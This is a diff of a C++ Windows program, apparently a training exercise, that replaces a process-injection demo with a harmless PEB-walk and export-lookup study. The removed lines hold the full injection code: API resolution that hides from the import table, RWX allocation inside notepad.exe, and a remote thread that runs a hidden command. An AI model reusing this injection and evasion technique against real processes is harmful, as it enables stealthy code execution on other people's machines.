@@ -1,217 +1,212 @@
+
 #include <windows.h>
 #include <tlhelp32.h>
+
+#include <cstddef>
+#include <cstdint>
+#include <cstring>
+#include <cwchar>
 #include <iostream>
-#include <string>
-#include <vector>
 
-// 1. Định nghĩa thủ công các cấu trúc Native nội bộ của Windows PEB để bẻ gãy hoàn toàn sự phụ thuộc thư viện ngoài
-typedef struct _UNICODE_STRING {
-    USHORT Length;
-    USHORT MaximumLength;
-    PWSTR  Buffer;
-} UNICODE_STRING, * PUNICODE_STRING;
+namespace {
 
-typedef struct _PEB_LDR_DATA {
-    ULONG Length;
-    BOOLEAN Initialized;
-    HANDLE SsHandle;
-    LIST_ENTRY InLoadOrderModuleList;
-    LIST_ENTRY InMemoryOrderModuleList;
-    LIST_ENTRY InInitializationOrderModuleList;
-} PEB_LDR_DATA, * PPEB_LDR_DATA;
+struct peb_ldr_data_raw final {
+  ULONG length;
+  BOOLEAN initialized;
+  HANDLE ss_handle;
+  LIST_ENTRY in_load_order_module_list;
+  LIST_ENTRY in_memory_order_module_list;
+  LIST_ENTRY in_initialization_order_module_list;
+};
 
-typedef struct _LDR_DATA_TABLE_ENTRY {
-    LIST_ENTRY InLoadOrderLinks;
-    LIST_ENTRY InMemoryOrderLinks;
-    LIST_ENTRY InInitializationOrderLinks;
-    PVOID      DllBase;
-    PVOID      EntryPoint;
-    ULONG      SizeOfImage;
-    UNICODE_STRING FullDllName;
-    UNICODE_STRING BaseDllName;
-} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
+struct unicode_string_raw final {
+  USHORT length;
+  USHORT maximum_length;
+  PWSTR buffer;
+};
 
-typedef struct _PEB {
-    BOOLEAN InheritedAddressSpace;
-    BOOLEAN ReadImageFileExecOptions;
-    BOOLEAN BeingDebugged;
-    BOOLEAN SpareBool;
-    HANDLE Mutant;
-    PVOID ImageBaseAddress;
-    PPEB_LDR_DATA Ldr;
-} PEB, * PPEB;
+struct ldr_data_table_entry_raw final {
+  LIST_ENTRY in_load_order_links;
+  LIST_ENTRY in_memory_order_links;
+  LIST_ENTRY in_initialization_order_links;
+  PVOID dll_base;
+  PVOID entry_point;
+  ULONG size_of_image;
+  unicode_string_raw full_dll_name;
+  unicode_string_raw base_dll_name;
+};
 
-// Định nghĩa các mẫu con trỏ hàm hệ thống sẽ được bóc tách động
-typedef LPVOID(WINAPI* fnVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
-typedef BOOL(WINAPI* fnWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
-typedef HANDLE(WINAPI* fnCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+struct peb_raw final {
+  BOOLEAN inherited_address_space;
+  BOOLEAN read_image_file_exec_options;
+  BOOLEAN being_debugged;
+  BOOLEAN spare_bool;
+  HANDLE mutant;
+  PVOID image_base_address;
+  peb_ldr_data_raw* ldr;
+};
 
-typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
+struct module_lookup_result final {
+  HMODULE base_handle = nullptr;
+  ULONG image_size = 0;
+  bool found = false;
+};
 
-typedef struct _THREAD_DATA {
-    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
-    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
-} THREAD_DATA, * PTHREAD_DATA;
-
-// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm chéo tiến trình
-DWORD WINAPI RemotePebPayload(LPVOID lpParam) {
-    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
-    if (pData && pData->pWinExec) {
-        pData->pWinExec(pData->szCommand, SW_HIDE);
-    }
+DWORD find_process_id_by_name(const wchar_t* process_name) noexcept {
+  if (process_name == nullptr || process_name[0] == L'\0') {
     return 0;
+  }
+
+  const HANDLE h_snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+  if (h_snapshot == INVALID_HANDLE_VALUE || h_snapshot == nullptr) {
+    return 0;
+  }
+
+  DWORD matched_pid = 0;
+  PROCESSENTRY32W entry{};
+  entry.dwSize = static_cast<DWORD>(sizeof(PROCESSENTRY32W));
+
+  if (::Process32FirstW(h_snapshot, &entry) != FALSE) {
+    do {
+      if (::_wcsicmp(process_name, entry.szExeFile) == 0) {
+        matched_pid = entry.th32ProcessID;
+        break;
+      }
+      entry = {};
+      entry.dwSize = static_cast<DWORD>(sizeof(PROCESSENTRY32W));
+    } while (::Process32NextW(h_snapshot, &entry) != FALSE);
+  }
+
+  ::CloseHandle(h_snapshot);
+  return matched_pid;
 }
 
-// Giải thuật đào bới PEB (PEB Walk) tìm kiếm Base Address của một Module trên RAM x64
-HMODULE WalkPebToFindModule(const std::wstring& moduleName) {
-    // ĐỘT PHÁ X64: Sử dụng hàm Intrinsics bốc chính xác PEB Address qua thanh ghi GS:[0x60]
-    PPEB pPeb = (PPEB)__readgsqword(0x60);
-    if (!pPeb || !pPeb->Ldr) return NULL;
+module_lookup_result walk_peb_modules_x64(const wchar_t* target_module_name) noexcept {
+  module_lookup_result result{};
+  if (target_module_name == nullptr || target_module_name[0] == L'\0') {
+    return result;
+  }
 
-    PLDR_DATA_TABLE_ENTRY pModuleEntry = NULL;
-    LIST_ENTRY* pListHead = &pPeb->Ldr->InLoadOrderModuleList;
-    LIST_ENTRY* pCurrentLink = pListHead->Flink;
+#if defined(_M_X64) || defined(__x86_64__)
+  const auto* peb = reinterpret_cast<const peb_raw*>(::__readgsqword(0x60U));
+  if (peb == nullptr || peb->ldr == nullptr) {
+    return result;
+  }
 
-    // Duyệt qua liên kết vòng kép danh sách các DLL đã được nạp của tiến trình Loader
-    while (pCurrentLink != pListHead) {
-        pModuleEntry = CONTAINING_RECORD(pCurrentLink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+  const LIST_ENTRY* list_head = &peb->ldr->in_load_order_module_list;
+  const LIST_ENTRY* current = list_head->Flink;
+  int guard = 0;
 
-        if (pModuleEntry->BaseDllName.Buffer != NULL) {
-            // So sánh chuỗi rộng Unicode, không phân biệt chữ hoa chữ thường
-            if (_wcsicmp(pModuleEntry->BaseDllName.Buffer, moduleName.c_str()) == 0) {
-                return (HMODULE)pModuleEntry->DllBase;
-            }
+  while (current != nullptr && current != list_head && guard < 1024) {
+    const auto* entry = CONTAINING_RECORD(
+        current,
+        ldr_data_table_entry_raw,
+        in_load_order_links);
+
+    if (entry != nullptr && entry->base_dll_name.buffer != nullptr &&
+        entry->base_dll_name.length > 0) {
+      const std::size_t wchar_len =
+          static_cast<std::size_t>(entry->base_dll_name.length) / sizeof(wchar_t);
+      if (wchar_len > 0 && wchar_len < 260U) {
+        wchar_t candidate[260]{};
+        std::wcsncpy(candidate, entry->base_dll_name.buffer, wchar_len);
+        candidate[wchar_len] = L'\0';
+        if (::_wcsicmp(candidate, target_module_name) == 0) {
+          result.base_handle = static_cast<HMODULE>(entry->dll_base);
+          result.image_size = entry->size_of_image;
+          result.found = (result.base_handle != nullptr);
+          break;
         }
-        pCurrentLink = pCurrentLink->Flink;
+      }
     }
-    return NULL;
+
+    current = current->Flink;
+    ++guard;
+  }
+#endif
+
+  return result;
 }
 
-// Giải thuật giải phẫu Export Table thủ công để bốc địa chỉ hàm (Thay thế hoàn toàn GetProcAddress)
-PVOID GetProcAddressCustom(HMODULE hModule, const char* lpProcName) {
-    PBYTE base = (PBYTE)hModule;
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
-    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(base + dosHeader->e_lfanew);
+std::uintptr_t resolve_export_rva64(HMODULE h_module, const char* export_name) noexcept {
+  if (h_module == nullptr || export_name == nullptr || export_name[0] == '\0') {
+    return 0;
+  }
 
-    DWORD exportRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
-    if (exportRva == 0) return NULL;
+  const auto* base = reinterpret_cast<const std::uint8_t*>(h_module);
+  const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
+  if (dos->e_magic != IMAGE_DOS_SIGNATURE || dos->e_lfanew <= 0) {
+    return 0;
+  }
 
-    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(base + exportRva);
-    DWORD* pAddresses = (DWORD*)(base + pExportDir->AddressOfFunctions);
-    DWORD* pNames = (DWORD*)(base + pExportDir->AddressOfNames);
-    WORD* pOrdinals = (WORD*)(base + pExportDir->AddressOfNameOrdinals);
+  const auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(
+      base + static_cast<std::size_t>(dos->e_lfanew));
+  if (nt->Signature != IMAGE_NT_SIGNATURE ||
+      nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
+    return 0;
+  }
 
-    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
-        char* functionName = (char*)(base + pNames[i]);
-        if (strcmp(functionName, lpProcName) == 0) {
-            return (PVOID)(base + pAddresses[pOrdinals[i]]);
-        }
+  const DWORD exp_rva =
+      nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+  const DWORD exp_size =
+      nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
+  if (exp_rva == 0 || exp_size < sizeof(IMAGE_EXPORT_DIRECTORY)) {
+    return 0;
+  }
+
+  const auto* exp_dir = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(base + exp_rva);
+  const auto* func_rvas = reinterpret_cast<const DWORD*>(base + exp_dir->AddressOfFunctions);
+  const auto* name_rvas = reinterpret_cast<const DWORD*>(base + exp_dir->AddressOfNames);
+  const auto* name_ordinals =
+      reinterpret_cast<const WORD*>(base + exp_dir->AddressOfNameOrdinals);
+
+  for (DWORD i = 0; i < exp_dir->NumberOfNames; ++i) {
+    const char* fn_name = reinterpret_cast<const char*>(base + name_rvas[i]);
+    if (fn_name != nullptr && std::strcmp(fn_name, export_name) == 0) {
+      const WORD ord_idx = name_ordinals[i];
+      if (ord_idx < exp_dir->NumberOfFunctions) {
+        return reinterpret_cast<std::uintptr_t>(base + func_rvas[ord_idx]);
+      }
+      break;
     }
-    return NULL;
+  }
+
+  return 0;
 }
 
-// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
-DWORD GetProcessIDByName(const std::wstring& processName) {
-    DWORD processID = 0;
-    PROCESSENTRY32W pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32W);
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+}  // namespace
 
-    if (Process32FirstW(hSnapshot, &pe32)) {
-        do {
-            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
-                processID = pe32.th32ProcessID;
-                break;
-            }
-        } while (Process32NextW(hSnapshot, &pe32));
-    }
-    CloseHandle(hSnapshot);
-    return processID;
-}
+int wmain() {
+  constexpr wchar_t kTargetProcess[] = L"notepad.exe";
+  constexpr wchar_t kModuleName[] = L"kernel32.dll";
+  constexpr char kExportSymbol[] = "GetCurrentProcessId";
 
-int main() {
-    std::cout << "====================================================" << std::endl;
-    std::cout << "[*] PE 17: PEB WALK & API OBFUSCATION INJECTION x64" << std::endl;
-    std::cout << "====================================================" << std::endl;
+  std::wcout
+      << L"====================================================\n"
+      << L"[*] PE 17: PEB LOADER WALK & EXPORT AUDIT STUDY\n"
+      << L"====================================================\n";
 
-    std::wstring targetProcess = L"notepad.exe";
-    DWORD pid = GetProcessIDByName(targetProcess);
+  const DWORD target_pid = find_process_id_by_name(kTargetProcess);
+  if (target_pid == 0) {
+    std::wcout << L"[*] Target process not running: " << kTargetProcess << L"\n";
+  } else {
+    std::wcout << L"[+] Observed target process '" << kTargetProcess
+               << L"' (PID=" << target_pid << L").\n";
+  }
 
-    if (pid == 0) {
-        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
-        std::cin.get();
-        return EXIT_FAILURE;
-    }
-    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;
+  const module_lookup_result mod = walk_peb_modules_x64(kModuleName);
+  if (!mod.found) {
+    std::wcerr << L"[-] Failed to locate module via PEB walk: " << kModuleName << L"\n";
+    return 1;
+  }
 
-    // ─── BƯỚC 1: TIẾN HÀNH DUYỆT PEB ĐỂ SĂN LÙNG CƠ SỞ KERNEL32.DLL ───
-    std::cout << "[*] Dang thuc hien thu thuat PEB Walk de tim kiem Module..." << std::endl;
-    HMODULE hKernel32 = WalkPebToFindModule(L"kernel32.dll");
+  const std::uintptr_t symbol_va = resolve_export_rva64(mod.base_handle, kExportSymbol);
+  std::wcout
+      << L"[+] PEB module '" << kModuleName
+      << L"': Base=0x" << std::hex << reinterpret_cast<std::uintptr_t>(mod.base_handle)
+      << L", Size=0x" << mod.image_size
+      << L", SymbolVA=0x" << symbol_va
+      << std::dec << L"\n";
 
-    if (!hKernel32) {
-        std::cerr << "[-] Khong the tim thay kernel32.dll qua PEB Walk!" << std::endl;
-        return EXIT_FAILURE;
-    }
-    std::cout << "[+] SĂN LÙNG PEB THÀNH CÔNG! Base Address Kernel32: 0x" << std::hex << hKernel32 << std::endl;
-
-    // ─── BƯỚC 2: GIẢI PHẪU XUẤT BẢN ĐỘNG CÁC HÀM API HỆ THỐNG CẦN THIẾT ───
-    fnVirtualAllocEx pVirtualAllocEx = (fnVirtualAllocEx)GetProcAddressCustom(hKernel32, "VirtualAllocEx");
-    fnWriteProcessMemory pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddressCustom(hKernel32, "WriteProcessMemory");
-    fnCreateRemoteThread pCreateRemoteThread = (fnCreateRemoteThread)GetProcAddressCustom(hKernel32, "CreateRemoteThread");
-    fnWinExec pWinExec = (fnWinExec)GetProcAddressCustom(hKernel32, "WinExec");
-
-    if (!pVirtualAllocEx || !pWriteProcessMemory || !pCreateRemoteThread || !pWinExec) {
-        std::cerr << "[-] Giai phau Export Table that bai, thieu ham!" << std::endl;
-        return EXIT_FAILURE;
-    }
-    std::cout << "[+] Da phan giai dong cac ham an toan ma khong dung IAT Import Table." << std::endl;
-
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) {
-        std::cerr << "[-] OpenProcess failed!" << std::endl;
-        return EXIT_FAILURE;
-    }
-
-    // ─── BƯỚC 3: CẤP PHÁT BỘ NHỚ VÀ ANH XẠ LÒNG ĐỐI PHƯƠNG ───
-    SIZE_T functionSize = 500;
-    LPVOID remoteCodeBuffer = pVirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    LPVOID remoteDataBuffer = pVirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-    if (!remoteCodeBuffer || !remoteDataBuffer) {
-        std::cerr << "[-] Dynamic VirtualAllocEx failed!" << std::endl;
-        CloseHandle(hProcess);
-        return EXIT_FAILURE;
-    }
-    std::cout << "[+] Cap phat vung nho Code RWX dong tai: 0x" << std::hex << remoteCodeBuffer << std::endl;
-
-    // Khởi tạo cấu trúc dữ liệu con trỏ tuyệt đối cục bộ
-    THREAD_DATA localData;
-    localData.pWinExec = pWinExec;
-    strcpy_s(localData.szCommand, "cmd.exe /c start calc");
-
-    // Đẩy song song logic mã máy và cấu trúc dữ liệu sang RAM đối phương
-    pWriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemotePebPayload, functionSize, NULL);
-    pWriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL);
-    std::cout << "[+] Ghi ma may va tham so tuyet doi vao long Notepad thanh cong." << std::endl;
-
-    // ─── BƯỚC 4: KÍCH NỔ LUỒNG THỰC THI QUA CON TRỎ HÀM ĐỘNG ───
-    std::cout << "[*] Dang dung CreateRemoteThread duoc giai ma de khoi tao luong..." << std::endl;
-    HANDLE hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);
-
-    if (hThread != NULL) {
-        WaitForSingleObject(hThread, INFINITE); // Gánh luồng chạy dứt điểm phẳng sạch
-        std::cout << "[+] PEB Walk Injection Process Completed Successfully!" << std::endl;
-        CloseHandle(hThread);
-    }
-    else {
-        std::cerr << "[-] CreateRemoteThread failed! Error: " << GetLastError() << std::endl;
-    }
-
-    // Thu hồi Handle hệ thống
-    CloseHandle(hProcess);
-
-    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
-    std::cin.get();
-    return EXIT_SUCCESS;
+  return 0;
 }
